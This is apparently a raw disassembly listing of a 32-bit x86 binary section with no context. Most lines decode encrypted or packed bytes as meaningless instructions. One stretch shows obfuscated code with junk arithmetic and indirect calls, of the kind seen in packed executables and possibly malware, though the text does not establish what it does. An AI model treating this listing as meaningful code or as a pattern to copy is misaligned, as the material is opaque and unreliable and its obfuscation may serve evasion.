  4136a9:	jno    0x413642
  4136ab:	sub    BYTE PTR [ebp+0x31],ah
  4136ae:	add    BYTE PTR [edi-0x3a6f4445],0xbb
  4136b5:	mov    ebx,0x404e5ce3
  4136ba:	xchg   ebx,eax
  4136bb:	cmp    BYTE PTR [edi],bh
  4136bd:	icebp  
  4136be:	adc    ebp,DWORD PTR [ecx-0x1a]
  4136c1:	pop    eax
  4136c2:	xor    eax,0xe1d9ff95
  4136c7:	mov    edi,0xc35e0265
  4136cc:	lahf   
  4136cd:	jns    0x413703
  4136cf:	sub    al,0x32
  4136d1:	aam    0x97
  4136d3:	add    cl,ch
  4136d5:	iret   
  4136d6:	(bad)  
  4136d7:	xchg   ebp,eax
  4136d8:	adc    bh,cl
  4136da:	pop    edi
  4136db:	cmp    ebp,eax
  4136dd:	inc    eax
  4136de:	dec    ebp
  4136df:	aam    0x82
  4136e1:	sub    BYTE PTR [edi+0x76],ch
  4136e4:	retf   0x9763
  4136e7:	in     eax,dx
  4136e8:	jp     0x4136cd
  4136ea:	sar    BYTE PTR [edx],1
  4136ec:	pop    edi
  4136ed:	iret   
  4136ee:	push   esp
  4136ef:	inc    esi
  4136f0:	push   0x91b63f3e
  4136f5:	outs   dx,BYTE PTR ds:[esi]
  4136f6:	dec    eax
  4136f7:	pushf  
  4136f8:	xor    edi,ecx
  4136fa:	repz in eax,dx
  4136fc:	scas   eax,DWORD PTR es:[edi]
  4136fd:	jnp    0x4136c7
  4136ff:	rcl    DWORD PTR [ecx],1
  413701:	pop    ebx
  413702:	cmp    DWORD PTR [esi-0x11bd1359],0xc9556d26
  41370c:	pop    ss
  41370d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41370e:	sbb    al,0x3a
  413710:	jle    0x4136b6
  413712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413713:	xor    eax,0x41c368fe
  413718:	out    0x9e,eax
  41371a:	dec    ebx
  41371b:	xchg   edx,eax
  41371c:	enter  0x573a,0xc3
  413720:	jge    0x413779
  413722:	fcomp  DWORD PTR [ebp+0x16aca2fd]
  413728:	stos   BYTE PTR es:[edi],al
  413729:	inc    ebp
  41372a:	jl     0x4136c0
  41372c:	mov    dh,0x2f
  41372e:	out    0x36,eax
  413730:	push   edx
  413731:	or     BYTE PTR [esi+0x64],dh
  413734:	push   ss
  413735:	cmp    DWORD PTR es:[ebx-0x66],eax
  413739:	and    ah,BYTE PTR [edx+0x44]
  41373c:	pop    ebp
  41373d:	mov    eax,DWORD PTR [edi+0x21313f1f]
  413743:	sub    eax,0x151e75a8
  413748:	adc    BYTE PTR [edx-0x3edb46f5],ch
  41374e:	push   ds
  41374f:	enter  0x5472,0x6
  413753:	sbb    cl,bh
  413755:	es ins BYTE PTR es:[edi],dx
  413757:	xlat   BYTE PTR ds:[ebx]
  413758:	sub    BYTE PTR [eax+0x2c],bl
  41375b:	pop    esp
  41375c:	pop    esp
  41375d:	or     bl,0xc
  413760:	jl     0x413745
  413762:	push   0xa
  413764:	outs   dx,BYTE PTR ds:[esi]
  413765:	push   0x85c60107
  41376a:	int3   
  41376b:	js     0x413759
  41376d:	repnz (bad) 
  41376f:	retf   
  413770:	dec    ah
  413772:	fisttp QWORD PTR [edx-0x29]
  413775:	fnstenv [ecx-0x1ea189f0]
  41377b:	mov    WORD PTR [esi+0x1b2d051a],es
  413781:	cmp    eax,0x74278b8c
  413786:	je     0x4137ed
  413788:	add    bh,BYTE PTR [esi]
  41378a:	imul   esp,DWORD PTR [edi],0x42
  41378d:	fldcw  WORD PTR [edx+ebx*2]
  413790:	cdq    
  413791:	mov    esi,fs
  413793:	arpl   WORD PTR [edi-0x5a124653],bx
  413799:	sbb    esi,DWORD PTR [ebx]
  41379b:	pop    edx
  41379c:	mov    ds:0xf1c2c1a4,eax
  4137a1:	(bad)  [eax]
  4137a3:	scas   al,BYTE PTR es:[edi]
  4137a4:	lea    eax,es:[esi]
  4137a7:	adc    eax,0x980ca5cf
  4137ac:	jg     0x413788
  4137ae:	mov    dh,0x87
  4137b0:	icebp  
  4137b1:	leave  
  4137b2:	cli    
  4137b3:	xchg   ebp,ebp
  4137b5:	sete   BYTE PTR [esi+ecx*4]
  4137b9:	mov    edi,0x73b370c3
  4137be:	pop    edi
  4137bf:	mov    dh,0x87
  4137c1:	mov    ecx,0xf53e8e76
  4137c6:	mov    WORD PTR [edi],cs
  4137c8:	xlat   BYTE PTR ds:[ebx]
  4137c9:	call   0x7a08:0xfce8781
  4137d0:	jne    0x4137c9
  4137d2:	daa    
  4137d3:	and    eax,0x2bdb67b7
  4137d8:	inc    eax
  4137d9:	add    dh,BYTE PTR [ebp+0x39bb74c8]
  4137df:	inc    esp
  4137e0:	mov    BYTE PTR [esi+0x53],0x5b
  4137e4:	adc    ebx,DWORD PTR [eax]
  4137e6:	loop   0x4137f1
  4137e8:	repz cmp esp,esp
  4137eb:	cmp    edi,DWORD PTR ds:0x30d8042b
  4137f1:	push   ecx
  4137f2:	sub    eax,0x99107df8
  4137f7:	cli    
  4137f8:	adc    edi,esi
  4137fa:	sub    eax,0xbb6cd2b2
  4137ff:	repnz or BYTE PTR [edx],bh
  413802:	cli    
  413803:	add    eax,0xdae3b537
  413808:	gs pop es
  41380a:	jb     0x413823
  41380c:	jle    0x41386f
  41380e:	outs   dx,DWORD PTR ds:[esi]
  41380f:	cwde   
  413810:	xchg   DWORD PTR [ebx],ecx
  413812:	sahf   
  413813:	push   eax
  413814:	jno    0x413829
  413816:	(bad)
  41381b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41381c:	ins    DWORD PTR es:[edi],dx
  41381d:	sti    
  41381e:	retf   
  41381f:	dec    edx
  413820:	dec    edx
  413821:	push   ebx
  413822:	dec    edi
  413823:	dec    eax
  413824:	std    
  413825:	xor    DWORD PTR [eax+0x1407928e],esp
  41382b:	sub    BYTE PTR [esp+edx*4],al
  41382e:	in     al,0x97
  413830:	mov    edi,0xf1a012a0
  413835:	add    eax,0x3d41c58f
  41383a:	pop    es
  41383b:	mov    ecx,0xd361c94e
  413840:	mov    ebx,0x73ecb8b5
  413845:	push   edx
  413846:	xor    al,0xd9
  413848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413849:	leave  
  41384a:	add    DWORD PTR [ebp+ebx*2+0x7f04daa9],edx
  413851:	adc    bh,bl
  413853:	add    eax,0x8373af32
  413858:	pop    ecx
  413859:	or     esi,DWORD PTR [ebx]
  41385b:	loop   0x41380e
  41385d:	(bad)
  413860:	mov    al,ds:0x86e0fc9e
  413865:	and    al,0xe3
  413867:	adc    al,0xcb
  413869:	mov    dh,0x33
  41386b:	int3   
  41386c:	xchg   esp,eax
  41386d:	dec    ecx
  41386e:	sar    DWORD PTR [bx+si],0xd8
  413872:	push   0x653da7b1
  413877:	bound  ecx,QWORD PTR [esp+esi*8+0x7b49a73c]
  41387e:	sub    esp,0x1d
  413881:	sub    BYTE PTR [ecx],cl
  413883:	in     al,dx
  413884:	out    dx,al
  413885:	mov    es,WORD PTR [edx-0xc]
  413888:	movd   DWORD PTR [ecx+0x43],mm6
  41388c:	push   0x7d
  41388e:	int    0xe4
  413890:	inc    esi
  413891:	jmp    0xa343e7d3
  413896:	dec    edx
  413897:	dec    eax
  413898:	and    ecx,esi
  41389a:	(bad)  
  41389b:	(bad)  
  41389c:	push   esi
  41389d:	retf   0x6554
  4138a0:	jnp    0x41385d
  4138a2:	and    al,dh
  4138a4:	loopne 0x413855
  4138a6:	sti    
  4138a7:	scas   al,BYTE PTR es:[edi]
  4138a8:	int    0xa6
  4138aa:	stos   DWORD PTR es:[edi],eax
  4138ab:	shr    BYTE PTR [eax+0x32d502f9],1
  4138b1:	sub    eax,0xa7dc2d08
  4138b6:	pop    esi
  4138b7:	sti    
  4138b8:	push   es
  4138b9:	or     ch,BYTE PTR [eax+edx*1]
  4138bc:	push   edx
  4138bd:	jmp    0x23ff640e
  4138c2:	mov    eax,ds:0x12417539
  4138c7:	outs   dx,DWORD PTR ds:[esi]
  4138c8:	loop   0x4138e8
  4138ca:	(bad)  
  4138cb:	cmp    esp,ebp
  4138cd:	adc    ecx,DWORD PTR [ebx-0x724ad17]
  4138d3:	xor    ah,BYTE PTR [ebx-0x42a5658]
  4138d9:	adc    al,0xeb
  4138db:	pushf  
  4138dc:	and    dh,BYTE PTR [ebx-0x72]
  4138df:	adc    al,0x2c
  4138e1:	pusha  
  4138e2:	jns    0x41393b
  4138e4:	retf   0x55a4
  4138e7:	std    
  4138e8:	add    eax,0x60ba4459
  4138ed:	ds pop eax
  4138ef:	jmp    0x2fb3:0xd512e089
  4138f6:	inc    edx
  4138f7:	mov    dl,BYTE PTR [ebp+esi*8+0x50087eb7]
  4138fe:	or     ebp,ebp
  413900:	pop    edx
  413901:	hlt    
  413902:	ficomp WORD PTR [eax-0x55]
  413905:	inc    esi
  413906:	xor    dh,ah
  413908:	sbb    eax,DWORD PTR [edx]
  41390a:	imul   edi,DWORD PTR [edi+ebp*4],0x53faec49
  413911:	jne    0x413900
  413913:	adc    al,0x1c
  413915:	test   DWORD PTR [ebp-0x4859790f],esp
  41391b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41391c:	xchg   edx,eax
  41391d:	mov    dh,BYTE PTR [edi*8+0x53562f04]
  413924:	cdq    
  413925:	pusha  
  413926:	and    ecx,DWORD PTR [edx+ecx*2-0x58]
  41392a:	mov    ecx,0x10abc950
  41392f:	(bad)  
  413930:	jno    0x413974
  413932:	jl     0x4139ac
  413934:	js     0x4138c3
  413936:	iret   
  413937:	test   eax,0x7f6b3d6f
  41393c:	mov    eax,0x3f7a08ea
  413941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413942:	in     al,0xe
  413944:	rcr    ah,1
  413946:	ret    0x60eb
  413949:	icebp  
  41394a:	inc    ecx
  41394b:	fdiv   DWORD PTR [eax-0x3f]
  41394e:	adc    esi,DWORD PTR [ebp-0x3d0bdd74]
  413954:	lods   eax,DWORD PTR ds:[esi]
  413955:	data16 sahf 
  413957:	sahf   
  413958:	add    DWORD PTR [eax],edi
  41395a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41395c:	fsubr  QWORD PTR [edx-0x54]
  41395f:	push   esi
  413960:	or     al,0xe5
  413962:	mov    esp,0x34d70f86
  413967:	push   ebx
  413968:	lea    esp,[edi]
  41396a:	(bad)  
  41396b:	push   eax
  41396c:	(bad)  
  41396e:	adc    dl,BYTE PTR [eax+edx*1+0x1c]
  413972:	jl     0x413915
  413974:	and    eax,0xa98b6d95
  413979:	ss ret 
  41397b:	cdq    
  41397c:	dec    ebx
  41397d:	jecxz  0x413949
  41397f:	(bad)  
  413980:	xchg   esp,eax
  413981:	adc    bh,BYTE PTR gs:[eax-0x72]
  413985:	je     0x4139a9
  413987:	mov    dh,0x59
  413989:	test   ah,ch
  41398b:	ret    0x3da0
  41398e:	jge    0x4139f7
  413990:	in     al,dx
  413991:	and    al,0xeb
  413993:	test   al,0xf3
  413995:	les    esi,FWORD PTR [eax]
  413997:	jo     0x413973
  413999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41399a:	mov    ch,0xeb
  41399c:	jp     0x4139e5
  41399e:	mov    dl,0xeb
  4139a0:	(bad)  
  4139a1:	enter  0x3711,0x8c
  4139a5:	xor    eax,0x749c28b7
  4139aa:	in     eax,dx
  4139ab:	pop    ds
  4139ac:	shr    DWORD PTR [esi],cl
  4139ae:	mov    ch,BYTE PTR [ebx-0x19]
  4139b1:	mov    cl,0xce
  4139b3:	arpl   WORD PTR [eax+0xa],cx
  4139b6:	dec    edx
  4139b7:	gs push ebx
  4139b9:	or     eax,0x624712e8
  4139be:	add    cl,bh
  4139c0:	add    eax,0x200ea70b
  4139c5:	loop   0x4139d1
  4139c7:	rcr    esi,0x93
  4139ca:	cmp    eax,0x4e39777b
  4139cf:	or     edi,0xfc72dc45
  4139d5:	pop    ecx
  4139d6:	dec    esp
  4139d7:	inc    edi
  4139d8:	inc    ebp
  4139d9:	adc    edx,ecx
  4139db:	popf   
  4139dc:	pop    esp
  4139dd:	cli    
  4139de:	cmp    esp,DWORD PTR [eax]
  4139e0:	mov    ebx,0x59a8796b
  4139e5:	es jle 0x413a00
  4139e8:	dec    ecx
  4139e9:	push   ecx
  4139ea:	pop    esp
  4139eb:	call   0x33ad:0xfce73e5a
  4139f2:	mov    al,0xa6
  4139f4:	sbb    eax,0x8d840ac6
  4139f9:	lahf   
  4139fa:	or     edi,DWORD PTR [ecx]
  4139fc:	addr16 jmp 0x4139d9
  4139ff:	xor    al,0x2f
  413a01:	xor    DWORD PTR [edx],0x54590ae9
  413a07:	and    al,0x1d
  413a09:	sahf   
  413a0a:	xchg   esp,eax
  413a0b:	into   
  413a0c:	je     0x413a17
  413a0e:	aam    0x44
  413a10:	add    BYTE PTR ds:0x2a6117f1,bh
  413a16:	inc    ebx
  413a17:	es nop
  413a19:	xchg   esp,eax
  413a1a:	add    edi,DWORD PTR [ecx]
  413a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a1d:	mov    ebp,0x81a91f4d
  413a22:	loope  0x413a7f
  413a24:	xor    ecx,ebx
  413a26:	movzx  edi,WORD PTR ds:0x428225
  413a2d:	sub    edi,DWORD PTR ds:0x4282b1
  413a33:	mov    DWORD PTR ds:0x428225,edi
  413a39:	shl    ecx,0x1e
  413a3c:	cmp    DWORD PTR ds:0x428211,0x0
  413a43:	mov    edi,DWORD PTR ds:0x428195
  413a49:	mov    edi,0x1f3c
  413a4e:	mov    edi,0x1913
  413a53:	jmp    0x413ad6
  413a58:	mov    DWORD PTR ds:0x42827d,0x3fb9
  413a62:	cmp    DWORD PTR ds:0x428211,0x0
  413a69:	jae    0x413ab8
  413a6f:	push   0x6b66
  413a74:	push   DWORD PTR [ebp-0x24]
  413a77:	push   0x5d4a
  413a7c:	push   0x2142
  413a81:	push   0x35c9
  413a86:	call   DWORD PTR ds:0x428abc
  413a8c:	adc    DWORD PTR ds:0x428285,0x428235
  413a96:	xor    edi,edi
  413a98:	xor    edi,DWORD PTR ds:0x428235
  413a9e:	sbb    DWORD PTR ds:0x428269,edi
  413aa4:	sub    DWORD PTR ds:0x4282c5,edi
  413aaa:	mov    edi,DWORD PTR ds:0x428265
  413ab0:	mov    edi,DWORD PTR [edi]
  413ab2:	sbb    DWORD PTR ds:0x4281b1,edi
  413ab8:	or     edi,DWORD PTR ds:0x42822d
  413abe:	mov    edi,DWORD PTR ds:0x428229
  413ac4:	xor    edi,DWORD PTR ds:0x42827d
  413aca:	mov    DWORD PTR ds:0x428229,edi
  413ad0:	sbb    edi,DWORD PTR ds:0x428279
  413ad6:	mov    edi,0xa6069caf
  413adb:	xor    eax,edi
  413add:	shr    eax,0x2
  413ae0:	or     eax,ecx
  413ae2:	sub    ecx,DWORD PTR ds:0x428269
  413ae8:	mov    DWORD PTR [ebp-0xc],eax
  413aeb:	cmp    DWORD PTR ds:0x4282c5,0x0
  413af2:	mov    DWORD PTR ds:0x4281b1,0x1d2a
  413afc:	mov    ecx,DWORD PTR ds:0x4282cd
  413b02:	jmp    0x413b54
  413b07:	mov    DWORD PTR ds:0x428271,0x7f44
  413b11:	mov    DWORD PTR ds:0x4282c9,edi
  413b17:	cmp    DWORD PTR ds:0x4282c5,0x0
  413b1e:	je     0x413b3c
  413b24:	push   0x428065
  413b29:	push   DWORD PTR [ebp-0x1c]
  413b2c:	call   DWORD PTR ds:0x4289e8
  413b32:	neg    ecx
  413b34:	xor    ecx,ecx
  413b36:	xor    DWORD PTR ds:0x428195,ecx
  413b3c:	add    DWORD PTR ds:0x4282cd,ecx
  413b42:	xor    DWORD PTR ds:0x4282b5,ebx
  413b48:	add    ecx,ecx
  413b4a:	sbb    DWORD PTR ds:0x428235,0x7f08
  413b54:	mov    eax,ds:0x4222a8
  413b59:	mov    DWORD PTR [ebp-0xc],eax
  413b5c:	cmp    DWORD PTR ds:0x4282d1,0x0
  413b63:	mov    DWORD PTR ds:0x4282c9,edi
  413b69:	mov    ecx,0x12e2
  413b6e:	jmp    0x413bb1
  413b73:	mov    eax,0x2a1e
  413b78:	mov    eax,0x263c
  413b7d:	cmp    DWORD PTR ds:0x4282d1,0x0
  413b84:	jbe    0x413ba5
  413b8a:	push   0x759a
  413b8f:	push   0x767d
  413b94:	push   DWORD PTR [ebp-0x24]
  413b97:	call   DWORD PTR ds:0x4289ec
  413b9d:	xor    DWORD PTR ds:0x42820d,edi
  413ba3:	sbb    ecx,ecx
  413ba5:	xor    ecx,0x3d5b
  413bab:	sub    DWORD PTR ds:0x428225,edi
  413bb1:	mov    eax,DWORD PTR [ebp-0x28]
  413bb4:	mov    DWORD PTR [ebp-0x24],eax
  413bb7:	and    DWORD PTR ds:0x428219,ecx
  413bbd:	mov    ecx,DWORD PTR [ebp-0x24]
  413bc0:	push   0x4
  413bc2:	movzx  eax,BYTE PTR ds:0x4281a1
  413bc9:	adc    DWORD PTR ds:0x428205,eax
  413bcf:	pop    eax
  413bd0:	mov    DWORD PTR ds:0x42823d,0x5fac
  413bda:	jmp    0x413f64
  413bdf:	(bad)  
  413be0:	(bad)  
  413be1:	cmc    
  413be2:	outs   dx,DWORD PTR ds:[esi]
  413be3:	mov    ebp,0x7fb74cb5
  413be8:	loope  0x413c5f
  413bea:	jno    0x413c2f
  413bec:	mov    ds:0x9159fbda,al
  413bf1:	mov    ebx,0xbbc590bb
  413bf6:	mov    ebx,0x24c5433
  413bfb:	jns    0x65e78b24
  413c01:	cmp    al,0x10
  413c03:	adc    al,0xf2
  413c05:	push   esp
  413c06:	scas   eax,DWORD PTR es:[edi]
  413c07:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  413c09:	ins    DWORD PTR es:[edi],dx
  413c0a:	test   ax,0xf14d
  413c0e:	mov    bl,0xe0
  413c10:	movaps xmm3,XMMWORD PTR [esi-0x28]
  413c14:	sbb    BYTE PTR [ebx+0x7425d51b],bl
  413c1a:	inc    esp
  413c1b:	int    0xe5
  413c1d:	xor    eax,0x792605ea
  413c22:	out    0xfa,al
  413c24:	pop    eax
  413c25:	jbe    0x413c05
  413c27:	je     0x413beb
  413c29:	stos   DWORD PTR es:[edi],eax
  413c2a:	pop    esp
  413c2b:	mov    dl,BYTE PTR ds:0xe7328e23
  413c31:	stos   DWORD PTR es:[edi],eax
  413c32:	fwait
  413c33:	jns    0x413c2d
  413c35:	lods   al,BYTE PTR ds:[esi]
  413c36:	push   es
  413c37:	pop    ecx
  413c38:	icebp  
  413c39:	mov    eax,edx
  413c3b:	arpl   WORD PTR [edx-0xe],bx
  413c3e:	shl    BYTE PTR [edi-0x9],0xec
  413c42:	jo     0x413bfe
  413c44:	iret   
  413c45:	dec    esi
  413c46:	sbb    eax,0xb2a2b806
  413c4b:	xchg   DWORD PTR [edi+0x67],esi
  413c4e:	mov    dl,0xa1
  413c50:	xchg   ebx,eax
  413c51:	add    DWORD PTR [eax],eax
  413c53:	sti    
  413c54:	jbe    0x413c64
  413c56:	call   0x3120:0x8a7b3f1
  413c5d:	pop    esi
  413c5e:	xchg   DWORD PTR [eax],eax
  413c60:	js     0x413cd9
  413c62:	fisttp DWORD PTR [ebx-0x23]
  413c65:	sbb    ecx,ebx
  413c67:	push   cs
  413c68:	lods   eax,DWORD PTR ds:[esi]
  413c69:	imul   DWORD PTR [eax+0x768e41]
  413c6f:	jb     0x413c97
  413c71:	push   esi
  413c72:	xor    eax,0xb8473968
  413c77:	jne    0x413cee
  413c79:	mov    ebx,0xe37cca8c
  413c7e:	stos   DWORD PTR es:[edi],eax
  413c7f:	dec    ecx
  413c80:	int3   
  413c81:	(bad)  
  413c82:	push   ebp
  413c83:	fisttp WORD PTR [ecx+0x44441272]
  413c89:	lods   al,BYTE PTR ds:[esi]
  413c8a:	fisttp QWORD PTR [edi]
  413c8c:	iret   
  413c8d:	out    dx,eax
  413c8e:	jge    0x413cd8
  413c90:	out    dx,al
  413c91:	mov    ah,0x12
  413c93:	xchg   ah,dl
  413c95:	gs mov cl,0x24
  413c98:	sbb    eax,0xc868b23a
  413c9d:	test   DWORD PTR [ebx-0x3e],eax
  413ca0:	fldenv [ebp+0x3]
  413ca3:	lock pop esp
  413ca5:	mov    ah,0xfb
  413ca7:	add    DWORD PTR [ebx+0x53],ebp
  413caa:	cli    
  413cab:	jno    0x413cc4
  413cad:	dec    ah
  413caf:	jnp    0x413d13
  413cb1:	or     eax,0x99db9f79
  413cb6:	sub    eax,0x9df0aac1
  413cbb:	xchg   ecx,eax
  413cbc:	test   BYTE PTR [ebx],bl
  413cbe:	cmp    dh,BYTE PTR [eax+0x32e56e6e]
  413cc4:	cmp    BYTE PTR [esi-0x2d],bl
  413cc7:	add    ebp,esp
  413cc9:	hlt    
  413cca:	dec    ebp
  413ccb:	xchg   ebp,eax
  413ccc:	scas   eax,DWORD PTR es:[edi]
  413ccd:	mov    BYTE PTR [ebp+ecx*4-0x6b],cl
  413cd1:	ss inc edx
  413cd3:	shl    DWORD PTR [ebp-0x1d],cl
  413cd6:	jle    0x413cf4
  413cd8:	mov    ch,0xcd
  413cda:	fidiv  WORD PTR [eax+0x3d]
  413cdd:	inc    edx
  413cde:	(bad)  
  413cdf:	aam    0x12
  413ce1:	adc    DWORD PTR [ebx+eiz*8-0x14],edi
  413ce5:	cmp    bl,al
  413ce7:	rol    ebp,1
  413ce9:	fimul  DWORD PTR [eax]
  413ceb:	push   esi
  413cec:	push   es
  413ced:	dec    esi
  413cee:	xor    ebp,0x4d
  413cf1:	sbb    eax,0x290e7686
  413cf6:	inc    ecx
  413cf7:	enter  0x9391,0x2e
  413cfb:	sbb    BYTE PTR [edx+0x3ff1cc30],ch
  413d01:	add    ah,BYTE PTR [ebx]
  413d03:	xlat   BYTE PTR ds:[ebx]
  413d04:	add    al,0x72
  413d06:	or     BYTE PTR [eax-0x1c],0x69
  413d0a:	cmp    eax,0x115b3828
  413d0f:	sbb    DWORD PTR [esi],esi
  413d11:	ins    BYTE PTR es:[edi],dx
  413d12:	fidiv  WORD PTR [edx+esi*4]
  413d15:	sub    BYTE PTR [ebx],0x50
  413d18:	test   al,0x8c
  413d1a:	scas   eax,DWORD PTR es:[edi]
  413d1b:	outs   dx,BYTE PTR ds:[esi]
  413d1c:	mov    ah,0x18
  413d1e:	(bad)
  413d22:	mov    ds:0xcbfc4005,eax
  413d27:	mov    gs,WORD PTR [ebx-0x3e]
  413d2a:	cmp    ebp,DWORD PTR [esi]
  413d2c:	clc    
  413d2d:	js     0x413d98
  413d2f:	cmp    DWORD PTR [ebp+0x272d080a],esp
  413d35:	dec    ecx
  413d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d37:	(bad)  
  413d38:	scas   eax,DWORD PTR es:[edi]
  413d39:	xor    DWORD PTR [ebx],0xffffff8a
  413d3c:	pushf  
  413d3d:	sbb    ebx,edi
  413d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d40:	cld    
  413d41:	mov    ds:0xa042c302,al
  413d46:	mov    ebp,0x9a2b3d5
  413d4b:	sbb    ah,BYTE PTR [eax-0x2a]
  413d4e:	icebp  
  413d4f:	sub    eax,0x1ab1bd55
  413d54:	sub    eax,0x8f1c4865
  413d59:	adc    edx,esi
  413d5b:	sub    bh,ch
  413d5d:	(bad)  
  413d5f:	repz in al,dx
  413d61:	push   ds
  413d62:	(bad)  
  413d63:	push   edx
  413d64:	sub    bh,dh
  413d66:	daa    
  413d67:	test   BYTE PTR [eax-0x15f3e50d],al
  413d6d:	jle    0x413dca
  413d6f:	mov    ch,0x8a
  413d71:	js     0x413de0
  413d73:	stc    
  413d74:	into   
  413d75:	pop    ds
  413d76:	dec    edx
  413d77:	psubq  mm2,QWORD PTR [esp+ebx*2-0xf6366af]
  413d7f:	out    dx,al
  413d80:	mov    dh,0x9
  413d82:	nop
  413d83:	sbb    ebp,DWORD PTR [esi]
  413d85:	mov    esi,?
  413d87:	mov    ah,0x70
  413d89:	sbb    BYTE PTR [eax-0x5be8031f],0x0
  413d90:	loop   0x413d76
  413d92:	or     ecx,esp
  413d94:	in     al,dx
  413d95:	or     DWORD PTR ds:0xe9201652,esp
  413d9b:	repnz mov DWORD PTR [edx+0x32],esi
  413d9f:	cmp    al,0xdb
  413da1:	dec    esp
  413da2:	fld    TBYTE PTR [ecx+0x77ca56c7]
  413da8:	mov    cl,0xd1
  413daa:	retf   0xec92
  413dad:	scas   al,BYTE PTR es:[edi]
  413dae:	push   eax
  413daf:	mov    edi,0x354d5330
  413db4:	dec    esi
  413db5:	sub    ebx,DWORD PTR [eax+0x7e]
  413db8:	inc    ebx
  413db9:	mov    eax,esp
  413dbb:	sbb    eax,0x2a10bd28
  413dc0:	add    al,0x42
  413dc2:	jbe    0x413d9e
  413dc4:	xchg   ebp,eax
  413dc5:	cli    
  413dc6:	dec    eax
  413dc7:	test   edi,ebx
  413dc9:	ins    DWORD PTR es:[edi],dx
  413dca:	mov    ecx,0x97a0af60
  413dcf:	mov    DWORD PTR [ebx-0x57ca78fb],eax
  413dd5:	gs mov esp,0x8e7c7cc4
  413ddb:	nop
  413ddc:	call   0x918b:0x49b54c1a
  413de3:	adc    edi,DWORD PTR [ecx]
  413de5:	imul   edx,DWORD PTR [esi-0x38],0x98dae2f6
  413dec:	call   0xe02e:0xb49874f2
  413df3:	mov    WORD PTR [esi-0x484f5a3e],es
  413df9:	sbb    al,0x2f
  413dfb:	xlat   BYTE PTR ds:[ebx]
  413dfc:	sub    eax,0xf738520c
  413e01:	jecxz  0x413db2
  413e03:	aas    
  413e04:	pop    esi
  413e05:	cmp    al,0x2e
  413e07:	test   BYTE PTR [edx+ebp*8],dl
  413e0a:	fdiv   st,st(2)
  413e0c:	adc    dh,bl
  413e0e:	rol    DWORD PTR [edi],0x68
  413e11:	fwait
  413e12:	push   ss
  413e13:	in     al,0xde
  413e15:	dec    ebx
  413e16:	sti    
  413e17:	fsub   DWORD PTR [esi]
  413e19:	lock cmp ch,BYTE PTR ds:0xb3124bd4
  413e20:	repnz out 0x5c,al
  413e23:	ja     0x413e16
  413e25:	ja     0x413e6a
  413e27:	outs   dx,DWORD PTR ds:[esi]
  413e28:	addr16 xor eax,0xbf5d39b1
  413e2e:	sbb    esp,DWORD PTR [esi-0x520702dc]
  413e34:	add    BYTE PTR [esi+0x38],dh
  413e37:	into   
  413e38:	bound  esi,QWORD PTR [edi-0x7a]
  413e3b:	rol    cl,1
  413e3d:	pushf  
  413e3e:	or     eax,0x2739581b
  413e43:	xor    bl,0xd5
  413e46:	cld    
  413e47:	stos   BYTE PTR es:[edi],al
  413e48:	daa    
  413e49:	dec    edi
  413e4a:	call   0x8fe7:0xa2ca0435
  413e51:	jne    0x413e99
  413e53:	repnz mov BYTE PTR [esi+0x7f],ah
  413e57:	push   es
  413e58:	(bad)  
  413e59:	mov    cl,0xcb
  413e5b:	mov    ds:0xa41fff6f,al
  413e60:	xchg   edi,eax
  413e61:	push   esi
  413e62:	cmp    BYTE PTR [eax+0x7041da91],bh
  413e68:	push   eax
  413e69:	outs   dx,DWORD PTR ds:[esi]
  413e6a:	call   0x31e0:0x2699ecf8
  413e71:	(bad)  
  413e72:	sub    edx,DWORD PTR [eax+0x39]
  413e75:	push   ebx
  413e76:	std    
  413e77:	pop    esp
  413e78:	pop    ss
  413e79:	and    al,0x75
  413e7b:	xchg   ecx,eax
  413e7c:	shr    BYTE PTR [edx-0x2e],0x36
  413e80:	jge    0x413ec0
  413e82:	or     DWORD PTR [eax-0x3ab8d3ce],0x7e73ee37
  413e8c:	ret    0x9cfc
  413e8f:	stc    
  413e90:	and    BYTE PTR [edi],0x7b
  413e93:	dec    ebx
  413e94:	in     eax,dx
  413e95:	xor    ch,al
  413e97:	jo     0x413e57
  413e99:	push   ebx
  413e9a:	dec    ecx
  413e9b:	mov    edi,0xf20c12c6
  413ea0:	aaa    
  413ea1:	(bad)  
  413ea2:	jmp    0xd34a069
  413ea7:	popa   
  413ea8:	sbb    eax,0x25296d58
  413ead:	call   0x457ad7e2
  413eb2:	pop    es
  413eb3:	pop    ecx
  413eb4:	dec    eax
  413eb5:	jmp    0x413eea
  413eb7:	call   0xb213:0x1f75ca70
  413ebe:	jp     0x413f1a
  413ec0:	dec    eax
  413ec1:	out    dx,eax
  413ec2:	cmp    DWORD PTR [edx+0x32],esp
  413ec5:	push   ecx
  413ec6:	cli    
  413ec7:	push   es
  413ec8:	ins    BYTE PTR es:[edi],dx
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	(bad)  
  413ecc:	out    dx,eax
  413ecd:	fcmove st,st(7)
  413ecf:	addr16 push edx
  413ed1:	xchg   esp,eax
  413ed2:	add    eax,0xe20d78b9
  413ed7:	fisub  DWORD PTR [ebx-0xbef5e69]
  413edd:	stos   BYTE PTR es:[edi],al
  413ede:	cmp    eax,0x6e9e43da
  413ee3:	pop    eax
  413ee4:	jp     0x413ea0
  413ee6:	cmp    eax,0x41dcac70
  413eeb:	leave  
  413eec:	dec    esp
  413eed:	sub    al,0xa4
  413eef:	pusha  
  413ef0:	jp     0x413ef0
  413ef2:	jbe    0x413e75
  413ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ef5:	jne    0x413f3b
  413ef7:	mul    BYTE PTR [eax+eax*8+0x36230ef4]
  413efe:	inc    ebp
  413eff:	ret    
  413f00:	jmp    0x17f62198
  413f05:	mov    al,ds:0x6b9fa18a
  413f0a:	mov    dh,0x5b
  413f0c:	jb     0x413f6e
  413f0e:	clc    
  413f0f:	retf   
  413f10:	and    esp,DWORD PTR [ecx-0x7d]
